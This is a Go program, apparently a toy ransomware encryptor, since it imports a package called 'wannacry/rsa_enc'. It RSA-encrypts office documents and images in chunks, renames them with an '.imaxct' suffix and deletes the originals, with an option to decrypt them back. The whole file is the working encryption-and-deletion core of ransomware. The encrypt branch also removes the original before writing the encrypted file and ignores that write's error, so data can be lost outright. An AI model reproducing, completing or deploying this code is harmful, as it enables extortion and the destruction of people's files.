package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"wannacry/rsa_enc"
)

func canHandle(f string) bool {
	r := regexp.MustCompile(`(?i)(.*?)\.(ppt|pptx|xls|xlsx|doc|docx|jpg|jpeg|png|imaxct)$`)
	return r.MatchString(f)
}

func main() {
	opt := flag.String("opt", "e", "how to run")
	file := flag.String("o", "", "target directory")
	flag.Parse()

	if len(*file) == 0 || !canHandle(*file) {
		fmt.Fprint(os.Stderr, "wrong input file")
		return
	}

	bytes, err := ioutil.ReadFile(*file)
	if err != nil {
		fmt.Println(err)
		return
	}
	absFile, err := filepath.Abs(*file)
	if err != nil {
		return
	}

	path, filename := filepath.Split(absFile)

	totalLen := len(bytes)

	if strings.Compare(*opt, "d") == 0 {
		newFilename := filename[0:strings.LastIndex(filename, ".imaxct")]
		fullName := path + newFilename

		var finalRes []byte
		pos := 0
		for {
			if totalLen-pos >= 128 {
				tmp := bytes[pos : pos+128]
				res, err := rsa_enc.Decrypt(tmp)
				if err == nil {
					finalRes = append(finalRes, res...)
				} else {
					panic(err)
				}
				pos += 128

			} else if totalLen-pos > 0 {
				tmp := bytes[pos:totalLen]
				res, err := rsa_enc.Decrypt(tmp)
				if err == nil {
					finalRes = append(finalRes, res...)
				} else {
					panic(err)
				}
				break
			} else {
				break
			}
		}

		if err == nil {
			if ioutil.WriteFile(fullName, finalRes, 0666) != nil {
				fmt.Fprint(os.Stderr, "write error")
				return
			}
			os.Remove(absFile)
		} else {
			fmt.Fprint(os.Stderr, err)
		}
	} else {
		newFilename := absFile + ".imaxct"
		var finalRes []byte
		pos := 0

		for {
			if totalLen-pos >= 50 {
				tmp := bytes[pos : pos+50]
				res, err := rsa_enc.Encrypt(tmp)
				if err == nil {
					finalRes = append(finalRes, res...)
				} else {
					panic(err)
				}
				pos += 50
			} else if totalLen-pos > 0 {
				tmp := bytes[pos:totalLen]
				res, err := rsa_enc.Encrypt(tmp)
				if err == nil {
					finalRes = append(finalRes, res...)
				} else {
					panic(err)
				}
				break
			} else {
				break
			}
		}

		if err == nil {
			if os.Remove(absFile) != nil {
				fmt.Fprint(os.Stderr, "write error")
				return
			}
			ioutil.WriteFile(newFilename, finalRes, 0666)
		} else {
			fmt.Fprintln(os.Stderr, err)
		}
	}
}
